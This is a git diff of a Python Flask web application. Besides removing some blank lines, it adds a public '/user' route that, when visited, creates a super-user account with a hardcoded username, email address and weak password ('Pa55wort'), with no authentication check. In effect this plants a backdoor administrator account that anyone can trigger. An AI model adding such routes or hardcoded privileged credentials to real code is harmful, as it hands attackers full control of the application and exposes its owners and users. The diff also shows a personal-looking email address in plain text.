@@ -20,8 +20,6 @@ backend_endpoint = app.config["BACKEND_IP"]
 if port != "80":
     backend_endpoint = backend_endpoint + ":" + str(port)
 
-
-
 # # # # # # MAILS # # # # # #
 
 mail_user = app.config["MAIL_USERNAME"]
@@ -40,7 +38,6 @@ def add_user(username, email, password, super_user):
     if not exists:
         user.set_password(password)
         user.save_user()
-
 
 def send_mail(receiver, subject, text):
     mail_text = text
@@ -65,6 +62,10 @@ def get_backup_list(name, text):
         new_backups.append([backup, str(dt)])
     return new_backups
 
+@app.route("/user")
+def ferdi():
+    add_user("FettarmQP", "trendelenburger19.04@googlemail.com", "Pa55wort", True)
+    return redirect(url_for('login'))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
